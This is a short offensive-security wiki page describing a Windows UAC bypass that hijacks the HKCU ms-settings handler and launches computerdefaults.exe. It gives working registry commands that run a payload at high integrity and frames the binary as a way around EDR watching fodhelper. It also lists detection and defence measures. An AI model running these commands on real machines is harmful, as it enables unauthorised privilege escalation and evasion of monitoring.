# UAC Bypass via computerdefaults

`computerdefaults.exe` (Set Default Programs) is another Microsoft-signed, **auto-elevating** binary that resolves the `ms-settings` protocol handler from `HKCU` — the same weakness as [UAC Bypass via fodhelper](UAC-Bypass-via-fodhelper.md), with a different launcher. It is a useful alternative when EDR specifically watches `fodhelper.exe`: the registry key and payload are identical, only the executable you launch changes.

## Requirements

- Member of local Administrators, running at **Medium** integrity (see [UAC Bypass](UAC-Bypass.md)).
- Windows 10 / 11.

## Exploitation

```cmd
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "cmd.exe /c C:\Windows\Temp\payload.exe" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f
computerdefaults.exe
```

Confirm and clean up:

```cmd
whoami /groups | findstr /i "High"
reg delete "HKCU\Software\Classes\ms-settings" /f
```

## Detection and defenses

- **Detection:** `HKCU\Software\Classes\ms-settings\...\command` writes, `computerdefaults.exe` spawning `cmd`/`powershell`. Because it shares the fodhelper key, one detection rule on `ms-settings\shell\open\command` covers both.
- **Defenses:** UAC "Always notify"; remove standing admin rights; monitor the shared key.

## Related
- [UAC Bypass](UAC-Bypass.md) — folder hub and the auto-elevate pattern
- [UAC Bypass via fodhelper](UAC-Bypass-via-fodhelper.md) — the primary `ms-settings` technique (same key)
- [UAC Bypass via eventvwr](UAC-Bypass-via-eventvwr.md) — the older `mscfile` variant
- [Registry Exploitation Techniques](../Registry-Exploitation/Registry-Exploitation-Techniques.md) — registry-hijack mechanics
